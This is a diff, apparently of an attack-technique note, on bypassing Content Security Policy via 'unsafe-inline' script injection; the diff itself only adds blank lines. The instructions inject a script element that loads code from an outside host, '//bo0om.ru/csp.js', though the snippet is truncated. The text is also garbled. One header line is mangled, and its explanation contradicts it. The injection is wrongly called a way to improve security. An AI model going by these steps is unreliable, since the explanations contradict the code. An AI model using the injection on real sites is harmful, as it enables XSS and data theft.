@@ -37,11 +37,15 @@ To perform this attack, an attacker would need to find a page that allows for un
 
 This procedure can be used by attackers to bypass CSP policies and execute arbitrary code on a victim's browser, potentially leading to data theft, unauthorized actions, and malware infections.
 
+ 
+
 ## Requirements
 
 1. Access to a web page that allows for unsafe inline scripts
 
 1. Ability to inject a script into the web page
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ This procedure can be used by attackers to bypass CSP policies and execute arbit
 1. Regularly scan web pages for vulnerabilities that could be exploited to inject scripts
 
 1. Train users to be aware of phishing attacks and not click on suspicious links
+
+ 
 
 ## Objectives
 
@@ -61,13 +67,23 @@ This procedure can be used by attackers to bypass CSP policies and execute arbit
 
 1. Spread malware to other systems
 
+ 
+
 # Instructions
 
 1. To implement CSP with default source and unsafe inline, add the following line of code to your website's HTTP header:
 
+ 
+
+
+
 **Code**: [[Content-Security-Policy: default-src &#39;self&#39]]
 
+
+
 > This command sets the default source for the Content Security Policy to 'self', meaning that resources can only be loaded from the same origin as the website. However, it also allows the use of 'unsafe-inline' which can potentially allow for XSS attacks. It is recommended to avoid using 'unsafe-inline' and instead use a strict CSP policy to ensure the security of your website.
+
+
 
 **Command** ([[Configure Content Security Policy]]):
 
@@ -75,10 +91,18 @@ This procedure can be used by attackers to bypass CSP policies and execute arbit
 Content-Security-Policy: default-src 'self' 'unsafe-inline';
 ```
 
+
+
 2. Inject a CSP script into the head of a webpage.
+
+ 
+
+
 
 **Code**: [[script=document.createElement('script');
 script.sr]]
+
+
 
 > This command will create a new script element and set its source to '//bo0om.ru/csp.js'. It will then append this script element to the head of the first frame of the webpage. This command is useful for adding Content Security Policy (CSP) headers to a webpage to improve its security.
 
@@ -104,3 +128,5 @@ script.sr]]
 - [[Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)]]
 - [[Cross Site Scripting]]
 - [[CSP Bypass]]
+
+
